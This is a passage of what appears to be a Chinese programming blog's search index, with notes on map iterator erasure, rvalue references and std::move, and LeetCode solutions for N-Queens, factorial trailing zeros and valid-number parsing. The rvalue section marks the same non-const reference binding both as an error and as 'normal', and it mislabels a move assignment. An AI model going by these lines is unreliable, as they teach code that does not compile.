\uff09\u8fd9\u4e2a\u6267\u884c\u5e8f\u5217\u662f\u4e0d\u76f8\u540c\u7684\u3002\u524d\u8005\u5728erase\u6267\u884c\u524d\u8fdb\u884c\u4e86\u52a0\u64cd\u4f5c\uff0c\u5728it\u88ab\u5220\u9664(\u5931\u6548)\u524d\u8fdb\u884c\u4e86\u52a0\u64cd\u4f5c\uff0c\u662f\u5b89\u5168\u7684\uff1b\u540e\u8005\u662f\u5728erase\u6267\u884c\u540e\u624d\u8fdb\u884c\u52a0\u64cd\u4f5c\uff0c\u800c\u6b64\u65f6iter\u5df2\u7ecf\u88ab\u5220\u9664(\u5f53\u524d\u7684\u8fed\u4ee3\u5668\u5df2\u7ecf\u5931\u6548\u4e86)\uff0c\u5bf9\u4e00\u4e2a\u5df2\u7ecf\u5931\u6548\u7684\u8fed\u4ee3\u5668\u8fdb\u884c\u52a0\u64cd\u4f5c\uff0c\u884c\u4e3a\u662f\u4e0d\u53ef\u9884\u671f\u7684\uff0c\u8fd9\u79cd\u5199\u6cd5\u52bf\u5fc5\u4f1a\u5bfc\u81f4 map\u64cd\u4f5c\u7684\u5931\u8d25\u5e76\u5f15\u8d77\u8fdb\u7a0b\u7684\u5f02\u5e38\u3002 \u800c\u5bf9\u4e8evector\uff0c\u53ef\u4ee5\u8fd9\u6837 iter=v.erase(iter);","title":"Map\u904d\u5386\u5220\u9664"},{"location":"c_cpp/2022_01_05_rvalue/","text":"\u53f3\u503c\u5f15\u7528\u548cmove\u8bed\u4e49 \u00b6 \u5de6\u503c\u548c\u53f3\u503c \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u4e86\u89e3\u4e00\u4e9b\u5de6\u503c\uff08lvalue, location value\uff09\u548c\u53f3\u503c\uff08rvalue, read value\uff09\u7684\u6982\u5ff5\u3002\u901a\u4fd7\u6765\u8bf4\uff0c\u5de6\u503c\u53ef\u4ee5\u51fa\u73b0\u5728\u7b49\u53f7\u7684\u5de6\u8fb9\u548c\u53f3\u8fb9\uff0c\u53f3\u503c\u53ea\u80fd\u51fa\u73b0\u5728\u7b49\u53f7\u53f3\u8fb9\u3002\u5de6\u503c\uff0c\u6307\u7684\u662f\u5982\u679c\u4e00\u4e2a\u8868\u8fbe\u5f0f\u53ef\u4ee5\u5f15\u7528\u5230\u67d0\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5e76\u4e14\u8fd9\u4e2a\u5bf9\u8c61\u662f\u4e00\u5757\u5185\u5b58\u7a7a\u95f4\u4e14\u53ef\u4ee5\u88ab\u68c0\u67e5\u548c\u5b58\u50a8\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u5c31\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u5de6\u503c[ 1 ]\u3002\u5373\u5de6\u503c\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u901a\u8fc7&\u64cd\u4f5c\u7b26\u6765\u83b7\u53d6\u5176\u5730\u5740\u3002\u5982\u679c\u4e00\u4e2a\u8868\u8fbe\u5f0f\u4e0d\u662f\u5de6\u503c\uff0c\u5c31\u662f\u53f3\u503c\u3002 C++\u4e2d\u5e38\u89c1\u7684\u51fa\u73b0\u53f3\u503c\u7684\u60c5\u51b5[ 2 ]: \u5e38\u91cf\u5b57\u9762\u91cf \u51fd\u6570\u8c03\u7528\u8fd4\u56de\u7684\u503c\u6216\u5bf9\u8c61\uff08\u5de6\u503c\u5f15\u7528\u7c7b\u578b\u9664\u5916\uff09 \u65e0\u540d\u5bf9\u8c61 c++ std::string(\"abcd\"); // \u65e0\u540d\u5bf9\u8c61 \u5de6\u503c\u5f15\u7528\u548c\u53f3\u503c\u5f15\u7528 \u00b6 \u5982\u679c\u4e00\u4e2a\u5de6\u503c\uff0c\u540c\u65f6\u662f\u5f15\u7528\uff0c\u5c31\u79f0\u4e3a\u201c\u5de6\u503c\u5f15\u7528\u201d[ 3 ]\u3002\u975econst\u5de6\u503c\u5f15\u7528\uff0c\u4e0d\u80fd\u7528\u53f3\u503c\u5bf9\u5176\u8d4b\u503c std::string& s = std::string(\"hello\");// \u4f1a\u62a5\u9519 // cannot bind non-const lvalue reference of type \u2018std::string&\u2019 {aka \u2018std::__cxx11::basic_string<char>&\u2019} to an rvalue of type \u2018std::string\u2019 {aka \u2018std::__cxx11::basic_string<char>\u2019} std::string& s = std::string(\"hello\"); // \u6b63\u5e38 \u53f3\u503c\u5f15\u7528\uff1a\u5fc5\u987b\u7ed1\u5b9a\u5230\u53f3\u503c\u7684\u5f15\u7528\uff0c\u5176\u5f15\u5165\u4e3b\u8981\u76ee\u7684\u662f\u652f\u6301\u79fb\u52a8\u64cd\u4f5c\uff08\u5b9e\u73b0move\u8bed\u4e49\uff09[ 2 ]\u3002 \u79fb\u52a8\u8bed\u4e49 \u00b6 \u79fb\u52a8\u8bed\u4e49\u5c31\u662f\u6240\u6709\u6743\u7684\u8f6c\u79fb\u3002\u4f8b\u5982 class CMyString{ private: char* m_pBuffer = nullptr; int m_iLen = 0; CMyString(CMyString&& other){ // \u79fb\u52a8\u6784\u9020\u51fd\u6570 this->m_iLen = other.m_iLen; this->m_pBuffer = other.m_pBuffer; other.m_pBuffer = nullptr; other.m_iLen = 0; } }; std::move \u51fd\u6570 \u00b6 \u79fb\u52a8\u6784\u9020\u51fd\u6570\u9700\u8981\u53f3\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u800c std::move \u51fd\u6570\u7684\u529f\u80fd\u5c31\u662f\u5c06\u8868\u8fbe\u5f0f\u8f6c\u5316\u4e3a\u53f3\u503c\u7c7b\u578b void myswap(CMyString& a, CMyString& b){ CMyString temp(a); // \u53d1\u751f\u62f7\u8d1d\u6784\u9020 a = b; // \u53d1\u751f\u62f7\u8d1d\u8d4b\u503c b = temp; // \u53d1\u751f\u62f7\u8d1d\u8d4b\u503c } \u56e0\u4e3a\u53c2\u6570 a \u548c b \u90fd\u662f\u5de6\u503c\uff0c\u9700\u8981\u4f7f\u7528 std::move \u89e6\u53d1\u79fb\u52a8\u8bed\u4e49 template<typename T> void myswap(CMyString& a, CMyString& b){ CMyString temp(std::move(a)); // a\u8f6c\u6362\u6210\u53f3\u503c\uff0c\u53d1\u751f\u79fb\u52a8\u6784\u9020 a = std::move(b); // \u53d1\u751f\u79fb\u52a8\u6784\u9020 b = std::move(temp); // \u53d1\u751f\u79fb\u52a8\u8d4b\u503c } \u8fd9\u6837\u5c31\u907f\u514d\u4e86\u62f7\u8d1d\u8fc7\u7a0b\u4e2d\u53cd\u590d\u7533\u8bf7\u5806\u7a7a\u95f4\u3002 \u62f7\u8d1d\u4f18\u5316Copy Elision \u00b6 \u8fd4\u56de\u503c\u62f7\u8d1d\u4f18\u5316 \u00b6 \u53c2\u6570\u503c\u62f7\u8d1d\u4f18\u5316 \u00b6 \u53c2\u8003 https://theonegis.github.io/cxx/C-%E7%A7%BB%E5%8A%A8%E8%AF%AD%E4%B9%89%E5%8F%8A%E6%8B%B7%E8%B4%9D%E4%BC%98%E5%8C%96/","title":"\u53f3\u503c\u5f15\u7528\u548cmove\u8bed\u4e49"},{"location":"c_cpp/2022_01_05_rvalue/#move","text":"","title":"\u53f3\u503c\u5f15\u7528\u548cmove\u8bed\u4e49"},{"location":"c_cpp/2022_01_05_rvalue/#_1","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u4e86\u89e3\u4e00\u4e9b\u5de6\u503c\uff08lvalue, location value\uff09\u548c\u53f3\u503c\uff08rvalue, read value\uff09\u7684\u6982\u5ff5\u3002\u901a\u4fd7\u6765\u8bf4\uff0c\u5de6\u503c\u53ef\u4ee5\u51fa\u73b0\u5728\u7b49\u53f7\u7684\u5de6\u8fb9\u548c\u53f3\u8fb9\uff0c\u53f3\u503c\u53ea\u80fd\u51fa\u73b0\u5728\u7b49\u53f7\u53f3\u8fb9\u3002\u5de6\u503c\uff0c\u6307\u7684\u662f\u5982\u679c\u4e00\u4e2a\u8868\u8fbe\u5f0f\u53ef\u4ee5\u5f15\u7528\u5230\u67d0\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5e76\u4e14\u8fd9\u4e2a\u5bf9\u8c61\u662f\u4e00\u5757\u5185\u5b58\u7a7a\u95f4\u4e14\u53ef\u4ee5\u88ab\u68c0\u67e5\u548c\u5b58\u50a8\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u5c31\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u5de6\u503c[ 1 ]\u3002\u5373\u5de6\u503c\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u901a\u8fc7&\u64cd\u4f5c\u7b26\u6765\u83b7\u53d6\u5176\u5730\u5740\u3002\u5982\u679c\u4e00\u4e2a\u8868\u8fbe\u5f0f\u4e0d\u662f\u5de6\u503c\uff0c\u5c31\u662f\u53f3\u503c\u3002 C++\u4e2d\u5e38\u89c1\u7684\u51fa\u73b0\u53f3\u503c\u7684\u60c5\u51b5[ 2 ]: \u5e38\u91cf\u5b57\u9762\u91cf \u51fd\u6570\u8c03\u7528\u8fd4\u56de\u7684\u503c\u6216\u5bf9\u8c61\uff08\u5de6\u503c\u5f15\u7528\u7c7b\u578b\u9664\u5916\uff09 \u65e0\u540d\u5bf9\u8c61 c++ std::string(\"abcd\"); // \u65e0\u540d\u5bf9\u8c61","title":"\u5de6\u503c\u548c\u53f3\u503c"},{"location":"c_cpp/2022_01_05_rvalue/#_2","text":"\u5982\u679c\u4e00\u4e2a\u5de6\u503c\uff0c\u540c\u65f6\u662f\u5f15\u7528\uff0c\u5c31\u79f0\u4e3a\u201c\u5de6\u503c\u5f15\u7528\u201d[ 3 ]\u3002\u975econst\u5de6\u503c\u5f15\u7528\uff0c\u4e0d\u80fd\u7528\u53f3\u503c\u5bf9\u5176\u8d4b\u503c std::string& s = std::string(\"hello\");// \u4f1a\u62a5\u9519 // cannot bind non-const lvalue reference of type \u2018std::string&\u2019 {aka \u2018std::__cxx11::basic_string<char>&\u2019} to an rvalue of type \u2018std::string\u2019 {aka \u2018std::__cxx11::basic_string<char>\u2019} std::string& s = std::string(\"hello\"); // \u6b63\u5e38 \u53f3\u503c\u5f15\u7528\uff1a\u5fc5\u987b\u7ed1\u5b9a\u5230\u53f3\u503c\u7684\u5f15\u7528\uff0c\u5176\u5f15\u5165\u4e3b\u8981\u76ee\u7684\u662f\u652f\u6301\u79fb\u52a8\u64cd\u4f5c\uff08\u5b9e\u73b0move\u8bed\u4e49\uff09[ 2 ]\u3002","title":"\u5de6\u503c\u5f15\u7528\u548c\u53f3\u503c\u5f15\u7528"},{"location":"c_cpp/2022_01_05_rvalue/#_3","text":"\u79fb\u52a8\u8bed\u4e49\u5c31\u662f\u6240\u6709\u6743\u7684\u8f6c\u79fb\u3002\u4f8b\u5982 class CMyString{ private: char* m_pBuffer = nullptr; int m_iLen = 0; CMyString(CMyString&& other){ // \u79fb\u52a8\u6784\u9020\u51fd\u6570 this->m_iLen = other.m_iLen; this->m_pBuffer = other.m_pBuffer; other.m_pBuffer = nullptr; other.m_iLen = 0; } };","title":"\u79fb\u52a8\u8bed\u4e49"},{"location":"c_cpp/2022_01_05_rvalue/#stdmove","text":"\u79fb\u52a8\u6784\u9020\u51fd\u6570\u9700\u8981\u53f3\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u800c std::move \u51fd\u6570\u7684\u529f\u80fd\u5c31\u662f\u5c06\u8868\u8fbe\u5f0f\u8f6c\u5316\u4e3a\u53f3\u503c\u7c7b\u578b void myswap(CMyString& a, CMyString& b){ CMyString temp(a); // \u53d1\u751f\u62f7\u8d1d\u6784\u9020 a = b; // \u53d1\u751f\u62f7\u8d1d\u8d4b\u503c b = temp; // \u53d1\u751f\u62f7\u8d1d\u8d4b\u503c } \u56e0\u4e3a\u53c2\u6570 a \u548c b \u90fd\u662f\u5de6\u503c\uff0c\u9700\u8981\u4f7f\u7528 std::move \u89e6\u53d1\u79fb\u52a8\u8bed\u4e49 template<typename T> void myswap(CMyString& a, CMyString& b){ CMyString temp(std::move(a)); // a\u8f6c\u6362\u6210\u53f3\u503c\uff0c\u53d1\u751f\u79fb\u52a8\u6784\u9020 a = std::move(b); // \u53d1\u751f\u79fb\u52a8\u6784\u9020 b = std::move(temp); // \u53d1\u751f\u79fb\u52a8\u8d4b\u503c } \u8fd9\u6837\u5c31\u907f\u514d\u4e86\u62f7\u8d1d\u8fc7\u7a0b\u4e2d\u53cd\u590d\u7533\u8bf7\u5806\u7a7a\u95f4\u3002","title":"std::move\u51fd\u6570"},{"location":"c_cpp/2022_01_05_rvalue/#copy-elision","text":"","title":"\u62f7\u8d1d\u4f18\u5316Copy Elision"},{"location":"c_cpp/2022_01_05_rvalue/#_4","text":"","title":"\u8fd4\u56de\u503c\u62f7\u8d1d\u4f18\u5316"},{"location":"c_cpp/2022_01_05_rvalue/#_5","text":"\u53c2\u8003 https://theonegis.github.io/cxx/C-%E7%A7%BB%E5%8A%A8%E8%AF%AD%E4%B9%89%E5%8F%8A%E6%8B%B7%E8%B4%9D%E4%BC%98%E5%8C%96/","title":"\u53c2\u6570\u503c\u62f7\u8d1d\u4f18\u5316"},{"location":"leetcode/2021_02_21_leetcode_n_queens/","text":"N\u7687\u540e\u7684\u4f4d\u8fd0\u7b97\u89e3\u6cd5 \u00b6 \u8fd9\u4e2a\u9898\u89e3\u4f7f\u7528\u5230\u7684\u4f4d\u8fd0\u7b97\u89e3\u6cd5\u6bd4\u8f83\u65b0\u9896\uff0c\u7279\u6b64\u8bb0\u5f55\u4e00\u4e0b\u3002 \u539f\u9898\u8fde\u63a5 \uff0c \u9898\u89e3 \u77e5\u8bc6\u70b9 \u00b6 \u4ee4\u4e00\u4e2a\u6574\u6570$x$\u7684\u4e8c\u8fdb\u5236\u8868\u793a\u4e2d\u6700\u540e\u4e00\u4e2a1\u4e3a0\uff0ceg: $(0110)_2$ => $(0100)_2$\u53ef\u4ee5\u8fd9\u6837 c++ x = x & (x - 1); \u4ee4\u4e00\u4e2a\u6574\u6570$x$\u7684\u4e8c\u8fdb\u5236\u8868\u793a\u4e2d\uff0c\u9664\u6700\u540e\u4e00\u4e2a1\u5916\uff0c\u5176\u5b83\u90fd\u4e3a0\uff0ceg: $(0110)_2$ => $(0010)_2$ c++ x = x & (-x); \u53ef\u4ee5\u7531\u4e0a\u4e00\u4e2a\u77e5\u8bc6\u70b9\u63a8\u5230\u8fc7\u6765\uff0c\u76f8\u5f53\u4e8e \u4ee4y= x & (x - 1)\uff0cx = x & \\~y\u3002\\~y\u76f8\u5f53\u4e8ex\u53d6\u53cd\u52a01\uff0c\u4e5f\u5c31\u662f-x C\u6807\u51c6\u5e93\u4e2d\u7684 __buildtin_ \u51fd\u6570 GCC\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7684builtin\u51fd\u6570\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u7b80\u5355\u5feb\u6377\u7684\u529f\u80fd\u6765\u65b9\u4fbf\u7a0b\u5e8f\u7f16\u5199\uff0c\u53e6\u5916\uff0c\u5f88\u591abuiltin\u51fd\u6570\u53ef\u7528\u6765\u4f18\u5316\u7f16\u8bd1\u7ed3\u679c\u3002\u8fd9\u4e9b\u51fd\u6570\u4ee5\u201c__builtin_\u201d\u4f5c\u4e3a\u51fd\u6570\u540d\u524d\u7f00\u3002 GCC provides quite a lot of builtin functions. These functions are part of standard C offered by the compiler and may come in various variants as per the gcc. These are also termed as hardware specific functions which are internally implemented in assembly or we can say machine instructions, with wide usage in low level programming and are generally target optimized. int __buildtin_ctz(unsigned int x) \uff1a\u8ba1\u7b97x\u672b\u5c3e(\u4e8c\u8fdb\u5236\u8868\u793a)0\u7684\u4e2a\u6570\uff0cx=0\u65f6\u7ed3\u679c\u672a\u5b9a\u4e49\u3002 \u4ee3\u7801 \u00b6 #pragma once #include<vector> #include<string> #include<set> using namespace std; #ifdef __GNUC__ #define clz(x) __builtin_clz(x) #define ctz(x) __builtin_ctz(x) #endif #ifdef _MSC_VER #include <intrin.h> uint32_t __inline ctz(uint32_t value) { unsigned long trailing_zero = 0; if (_BitScanForward(&trailing_zero, value)) { return trailing_zero; } else { // This is undefined, I better choose 32 than 0 return 32; } } uint32_t __inline clz(uint32_t value) { unsigned long leading_zero = 0; if (_BitScanReverse(&leading_zero, value)) { return 31 - leading_zero; } else { // Same remarks as above return 32; } } #endif class Solution { public: vector<vector<string>> solveNQueens(int n) { boardWidth = n; vector<int> queens(n, -1); vector<vector<string>> solution; solve(solution, queens, 0, 0, 0, 0); return solution; } private: int boardWidth; // columns, diagonals1(\u53f3\u4e0b\u65b9\u5411), diagonals2(\u5de6\u4e0b\u65b9\u5411)\u4e2d\uff0c\u4e3a1\u7684\u4f4d\u8868\u793a\u7b2cdepth\u884c\u4e0d\u80fd\u653e\u7f6e\u68cb\u5b50 void solve(vector<vector<string>> &solution, vector<int> &queens, int depth, int columns, int diagonals1, int diagonals2) { if (depth == boardWidth) { solution.push_back(generateSolution(queens)); return; } // (columns | diagonals1 | diagonals2)\u53ef\u4ee5\u653e\u7f6e\u68cb\u5b50\u7684\u5730\u65b9\u4e3a0\uff0c\u53d6\u53cd\u4e4b\u540e\uff0c\u53ef\u4ee5\u653e\u7f6e\u68cb\u5b50\u7684\u5730\u65b9\u4e3a1\uff0c\u4e0d\u53ef\u4ee5\u653e\u7f6e\u68cb\u5b50\u7684\u4e3a0 int available = ((1 << boardWidth) - 1) & (~(columns | diagonals1 | diagonals2));//\u4e3a0\u7684\u4f4d\u7f6e\u4e0d\u80fd\u653e\u7f6e\u68cb\u5b50 while (available != 0) { // available\u53d6\u53cd\u52a0\u4e00\uff0c\u518d\u548cavailabe\u76f8\u4e0e\uff0c\u5219\u53ef\u4ee5\u83b7\u53d6\u5230available\u6700\u53f3\u8fb9\u7684\u90a3\u4e2a1 int pos = available & (-available); // \u4ee4available\u6700\u53f3\u8fb9\u76841\u4e3a0 available = available & (available - 1); // __builtin_ctz\u65f6gcc\u63d0\u4f9b\u7684\uff0c\u7528mvc\u65f6\uff0c\u8981\u81ea\u5df1\u5b9e\u73b0 int column = ctz(pos);// __builtin_ctz(x)\uff0c\u8ba1\u7b97x\u672b\u5c3e0\u7684\u4e2a\u6570\uff0cx\u4e3a0\u65f6\u672a\u5b9a\u4e49 queens[depth] = column; solve(solution, queens, depth + 1, columns | pos, (diagonals1 | pos) >> 1, (diagonals2 | pos) << 1); queens[depth] = -1;//\u56de\u6eaf } } vector<string> generateSolution(vector<int> &queens) { vector<string> solution(boardWidth, string(boardWidth, '.')); for (int i = 0; i < boardWidth; i++) { solution[i][queens[i]] = 'Q'; } return solution; } };","title":"N\u7687\u540e\u7684\u4f4d\u8fd0\u7b97\u89e3\u6cd5"},{"location":"leetcode/2021_02_21_leetcode_n_queens/#n","text":"\u8fd9\u4e2a\u9898\u89e3\u4f7f\u7528\u5230\u7684\u4f4d\u8fd0\u7b97\u89e3\u6cd5\u6bd4\u8f83\u65b0\u9896\uff0c\u7279\u6b64\u8bb0\u5f55\u4e00\u4e0b\u3002 \u539f\u9898\u8fde\u63a5 \uff0c \u9898\u89e3","title":"N\u7687\u540e\u7684\u4f4d\u8fd0\u7b97\u89e3\u6cd5"},{"location":"leetcode/2021_02_21_leetcode_n_queens/#_1","text":"\u4ee4\u4e00\u4e2a\u6574\u6570$x$\u7684\u4e8c\u8fdb\u5236\u8868\u793a\u4e2d\u6700\u540e\u4e00\u4e2a1\u4e3a0\uff0ceg: $(0110)_2$ => $(0100)_2$\u53ef\u4ee5\u8fd9\u6837 c++ x = x & (x - 1); \u4ee4\u4e00\u4e2a\u6574\u6570$x$\u7684\u4e8c\u8fdb\u5236\u8868\u793a\u4e2d\uff0c\u9664\u6700\u540e\u4e00\u4e2a1\u5916\uff0c\u5176\u5b83\u90fd\u4e3a0\uff0ceg: $(0110)_2$ => $(0010)_2$ c++ x = x & (-x); \u53ef\u4ee5\u7531\u4e0a\u4e00\u4e2a\u77e5\u8bc6\u70b9\u63a8\u5230\u8fc7\u6765\uff0c\u76f8\u5f53\u4e8e \u4ee4y= x & (x - 1)\uff0cx = x & \\~y\u3002\\~y\u76f8\u5f53\u4e8ex\u53d6\u53cd\u52a01\uff0c\u4e5f\u5c31\u662f-x C\u6807\u51c6\u5e93\u4e2d\u7684 __buildtin_ \u51fd\u6570 GCC\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7684builtin\u51fd\u6570\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u7b80\u5355\u5feb\u6377\u7684\u529f\u80fd\u6765\u65b9\u4fbf\u7a0b\u5e8f\u7f16\u5199\uff0c\u53e6\u5916\uff0c\u5f88\u591abuiltin\u51fd\u6570\u53ef\u7528\u6765\u4f18\u5316\u7f16\u8bd1\u7ed3\u679c\u3002\u8fd9\u4e9b\u51fd\u6570\u4ee5\u201c__builtin_\u201d\u4f5c\u4e3a\u51fd\u6570\u540d\u524d\u7f00\u3002 GCC provides quite a lot of builtin functions. These functions are part of standard C offered by the compiler and may come in various variants as per the gcc. These are also termed as hardware specific functions which are internally implemented in assembly or we can say machine instructions, with wide usage in low level programming and are generally target optimized. int __buildtin_ctz(unsigned int x) \uff1a\u8ba1\u7b97x\u672b\u5c3e(\u4e8c\u8fdb\u5236\u8868\u793a)0\u7684\u4e2a\u6570\uff0cx=0\u65f6\u7ed3\u679c\u672a\u5b9a\u4e49\u3002","title":"\u77e5\u8bc6\u70b9"},{"location":"leetcode/2021_02_21_leetcode_n_queens/#_2","text":"#pragma once #include<vector> #include<string> #include<set> using namespace std; #ifdef __GNUC__ #define clz(x) __builtin_clz(x) #define ctz(x) __builtin_ctz(x) #endif #ifdef _MSC_VER #include <intrin.h> uint32_t __inline ctz(uint32_t value) { unsigned long trailing_zero = 0; if (_BitScanForward(&trailing_zero, value)) { return trailing_zero; } else { // This is undefined, I better choose 32 than 0 return 32; } } uint32_t __inline clz(uint32_t value) { unsigned long leading_zero = 0; if (_BitScanReverse(&leading_zero, value)) { return 31 - leading_zero; } else { // Same remarks as above return 32; } } #endif class Solution { public: vector<vector<string>> solveNQueens(int n) { boardWidth = n; vector<int> queens(n, -1); vector<vector<string>> solution; solve(solution, queens, 0, 0, 0, 0); return solution; } private: int boardWidth; // columns, diagonals1(\u53f3\u4e0b\u65b9\u5411), diagonals2(\u5de6\u4e0b\u65b9\u5411)\u4e2d\uff0c\u4e3a1\u7684\u4f4d\u8868\u793a\u7b2cdepth\u884c\u4e0d\u80fd\u653e\u7f6e\u68cb\u5b50 void solve(vector<vector<string>> &solution, vector<int> &queens, int depth, int columns, int diagonals1, int diagonals2) { if (depth == boardWidth) { solution.push_back(generateSolution(queens)); return; } // (columns | diagonals1 | diagonals2)\u53ef\u4ee5\u653e\u7f6e\u68cb\u5b50\u7684\u5730\u65b9\u4e3a0\uff0c\u53d6\u53cd\u4e4b\u540e\uff0c\u53ef\u4ee5\u653e\u7f6e\u68cb\u5b50\u7684\u5730\u65b9\u4e3a1\uff0c\u4e0d\u53ef\u4ee5\u653e\u7f6e\u68cb\u5b50\u7684\u4e3a0 int available = ((1 << boardWidth) - 1) & (~(columns | diagonals1 | diagonals2));//\u4e3a0\u7684\u4f4d\u7f6e\u4e0d\u80fd\u653e\u7f6e\u68cb\u5b50 while (available != 0) { // available\u53d6\u53cd\u52a0\u4e00\uff0c\u518d\u548cavailabe\u76f8\u4e0e\uff0c\u5219\u53ef\u4ee5\u83b7\u53d6\u5230available\u6700\u53f3\u8fb9\u7684\u90a3\u4e2a1 int pos = available & (-available); // \u4ee4available\u6700\u53f3\u8fb9\u76841\u4e3a0 available = available & (available - 1); // __builtin_ctz\u65f6gcc\u63d0\u4f9b\u7684\uff0c\u7528mvc\u65f6\uff0c\u8981\u81ea\u5df1\u5b9e\u73b0 int column = ctz(pos);// __builtin_ctz(x)\uff0c\u8ba1\u7b97x\u672b\u5c3e0\u7684\u4e2a\u6570\uff0cx\u4e3a0\u65f6\u672a\u5b9a\u4e49 queens[depth] = column; solve(solution, queens, depth + 1, columns | pos, (diagonals1 | pos) >> 1, (diagonals2 | pos) << 1); queens[depth] = -1;//\u56de\u6eaf } } vector<string> generateSolution(vector<int> &queens) { vector<string> solution(boardWidth, string(boardWidth, '.')); for (int i = 0; i < boardWidth; i++) { solution[i][queens[i]] = 'Q'; } return solution; } };","title":"\u4ee3\u7801"},{"location":"leetcode/2021_03_20_n_factorial_zeros/","text":"n\u7684\u9636\u4e58\u7ed3\u679c\u540e\u9762\u6709\u591a\u5c11\u4e2a0 \u00b6 \u539f\u9898 \u5206\u6790 \u00b6 \u9996\u5148\uff0c\u4e00\u4e2a5\u6700\u591a\u53ef\u4ee5\u4ea7\u751f1\u4e2a0\uff0c\u4f8b\u5982\uff1a5*2=10\uff0c15*4=60\u3002\u4f46\u662f\uff0c\u6ce8\u610f\u523025*4=100\uff0c75*4=300\uff0c\u8fd9\u79cd\u4f1a\u4ea7\u751f2\u4e24\u4e2a0\u3002\u7ecf\u8fc7\u89c2\u5bdf\u53ef\u4ee5\u5f97\u51fa\u8fd9\u6837\u7684\u7ed3\u8bba\uff1a\u4e00\u4e2a\u6570\u5b57\u7684\u8d28\u56e0\u5206\u89e3\u4e2d\u6709\u591a\u5c11\u4e2a5\uff0c\u5c31\u4f1a\u4ea7\u751f\u591a\u5c11\u4e2a0\u3002 \u6ce8\u610f\uff0c\u6211\u4eec\u4e0d\u5355\u72ec\u8003\u865110\u7684\u500d\u6570\uff0c\u56e0\u4e3a\uff0c\u4f8b\u5982\uff1a10=2*5\uff0c100=2*2*5*5\uff0c\u90fd\u7b26\u5408\u4e0a\u9762\u7684\u7ed3\u8bba\u3002 \u4ee3\u7801\u5b9e\u73b0 \u00b6 class Solution { public: int trailingZeroes(int n) { int factor=5; int num=0; while(factor<=n){ int t=n/factor; num+=t; factor*=5; } return num; } };","title":"n\u7684\u9636\u4e58\u7ed3\u679c\u540e\u9762\u6709\u591a\u5c11\u4e2a0"},{"location":"leetcode/2021_03_20_n_factorial_zeros/#n0","text":"\u539f\u9898","title":"n\u7684\u9636\u4e58\u7ed3\u679c\u540e\u9762\u6709\u591a\u5c11\u4e2a0"},{"location":"leetcode/2021_03_20_n_factorial_zeros/#_1","text":"\u9996\u5148\uff0c\u4e00\u4e2a5\u6700\u591a\u53ef\u4ee5\u4ea7\u751f1\u4e2a0\uff0c\u4f8b\u5982\uff1a5*2=10\uff0c15*4=60\u3002\u4f46\u662f\uff0c\u6ce8\u610f\u523025*4=100\uff0c75*4=300\uff0c\u8fd9\u79cd\u4f1a\u4ea7\u751f2\u4e24\u4e2a0\u3002\u7ecf\u8fc7\u89c2\u5bdf\u53ef\u4ee5\u5f97\u51fa\u8fd9\u6837\u7684\u7ed3\u8bba\uff1a\u4e00\u4e2a\u6570\u5b57\u7684\u8d28\u56e0\u5206\u89e3\u4e2d\u6709\u591a\u5c11\u4e2a5\uff0c\u5c31\u4f1a\u4ea7\u751f\u591a\u5c11\u4e2a0\u3002 \u6ce8\u610f\uff0c\u6211\u4eec\u4e0d\u5355\u72ec\u8003\u865110\u7684\u500d\u6570\uff0c\u56e0\u4e3a\uff0c\u4f8b\u5982\uff1a10=2*5\uff0c100=2*2*5*5\uff0c\u90fd\u7b26\u5408\u4e0a\u9762\u7684\u7ed3\u8bba\u3002","title":"\u5206\u6790"},{"location":"leetcode/2021_03_20_n_factorial_zeros/#_2","text":"class Solution { public: int trailingZeroes(int n) { int factor=5; int num=0; while(factor<=n){ int t=n/factor; num+=t; factor*=5; } return num; } };","title":"\u4ee3\u7801\u5b9e\u73b0"},{"location":"leetcode/2021_03_22_leetcode_valid_number/","text":"\u6709\u6548\u6570\u5b57 \u00b6 \u5224\u65ad\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u662f\u6709\u6548\u6570\u5b57\uff0c\u4f7f\u7528DFA\u6765\u6c42\u89e3\u3002 \u539f\u9898\u8fde\u63a5 DFA \u00b6 \u4ee3\u7801 \u00b6 class Solution { public: bool isNumber(string s) { int len=s.size(),idx=0; state=0; while(idx<len){ if(isDigital(s[idx])){ if(state==0||state==4){ state=1; }else if(state==3){ state=2; }else if(state==5||state==7){ state=6; } }else if(s[idx]=='e'||s[idx]=='E'){ if(state==1||state==2){ state=5; }else{ return false; } }else if(s[idx]=='.'){ if(state==0){ state=3; }else if(state==4){ state=3; }else if(state==1){ state=2; }else{ return false; } }else if(s[idx]=='+'||s[idx]=='-'){ if(state==0){ state=4; }else if(state==5){ state=7; }else{ return false; } }else{ return false; } idx++; } return state==1||state==2||state==6; } private: bool isDigital(char c){ return c>='0'&&c<='9'; } int state; };","title":"\u6709\u6548\u6570\u5b57"},{"location":"leetcode/2021_03_22_leetcode_valid_number/#_1","text":"\u5224\u65ad\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u662f\u6709\u6548\u6570\u5b57\uff0c\u4f7f\u7528DFA\u6765\u6c42\u89e3\u3002 \u539f\u9898\u8fde\u63a5","title":"\u6709\u6548\u6570\u5b57"},{"location":"leetcode/2021_03_22_leetcode_valid_number/#dfa","text":"","title":"DFA"},{"location":"leetcode/2021_03_22_leetcode_valid_number/#_2","text":"class Solution { public: bool isNumber(string s) { int len=s.size(),idx=0; state=0; while(idx<len){ if(isDigital(s[idx])){ if(state==0||state==4){ state=1; }else if(state==3){ state=2; }else if(state==5||state==7){ state=6; } }else if(s[idx]=='e'||s[idx]=='E'){ if(state==1||state==2){ state=5; }else{ return false; } }else if(s[idx]=='.'){ 